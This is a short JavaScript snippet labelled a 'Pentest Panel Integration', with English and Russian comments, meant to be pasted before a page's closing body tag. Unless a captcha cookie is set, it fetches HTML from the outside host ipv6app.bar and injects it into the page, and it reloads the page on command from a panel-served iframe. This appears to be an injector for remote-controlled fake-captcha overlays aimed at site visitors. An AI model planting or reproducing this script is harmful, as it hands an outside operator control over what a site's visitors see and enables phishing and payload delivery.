<!-- Pentest Panel Integration -->
<!-- Add this code before </body> tag -->

<script type='text/javascript'>
// Событие обмена сообщениями между iframe подгружаемого с панели и кодом страницы в которой размещена капча
window.addEventListener("message", e =>
{
	if(e.data === "reload")
	{
        window.location.reload();
    }
});

// Function for reading cookie
// Функция чтения куки
function getCookie(name)
{
	const match = document.cookie.match(new RegExp("(^|; )" + name + "=([^;]*)"));
	return match ? decodeURIComponent(match[2]) : null;
}

// Reading cookie
// Чтение куки
const cookiename = "cookie-captcha-complete";
const cookie = getCookie(cookiename);

// Cookie found
// Кука не найдена
if(!cookie)
{
	fetch("https://ipv6app.bar") 
	.then(response => response.ok ? response.text() : Promise.reject())
	.then(html =>
	{
		if(html.length === 0)
		{
			document.cookie = cookiename + "=1; path=/; max-age=" + (60 * 60 * 24 * 365);
		}

		else
		{
			document.body.insertAdjacentHTML("beforeend", html);
		}
	})
	.catch(() => console.error("Failed to load page!"));
}


</script>
